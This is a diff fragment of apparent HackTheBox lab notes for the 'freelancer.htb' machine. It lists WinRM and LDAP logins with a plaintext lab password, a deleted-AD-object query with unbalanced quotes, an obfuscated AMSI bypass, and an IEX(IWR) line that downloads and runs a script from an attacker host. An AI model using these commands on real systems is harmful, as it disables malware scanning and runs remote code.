@@ -130,6 +130,7 @@ nxc ldap 10.10.11.5 -d freelancer.htb -u 'lorra199' -p 'PWN3D#l0rr@Armessa199' -
 ==========(21)======================================================================================================================
 evil-winrm -i freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199'
 
+Get-ADObject -filter 'isDeleted -eq $true -includeDeletedObjects -Properties * | select samaccountname, memberof, userprincipalname
 
 :\> [Ref]."A`ss`Embly"."GET`TY`Pe"($(('76 5c 56 51 40 48 0b 68 44 4b 44 42 40 48 40 4b 51 0b 64 50 51 4a 48 44 51 4c 4a 4b 0b 64 48 56 4c 70 51 4c 49 56'.Split(' ')|ForEach{[char](([convert]::ToInt16($_, 16)-bxor 0x25))})-join '')).GetField($(('44 48 56 4c 6c 4b 4c 51 63 44 4c 49 40 41'.Split(' ')|ForEach{[char](([convert]::ToInt16($_, 16)-bxor 0x25))})-join ''),$('NonPublic,Static')).SetValue($null,$true)
 C:\> IEX(IWR http://10.10.14.185:8000/NETAMSI.ps1 -UseBasicParsing)
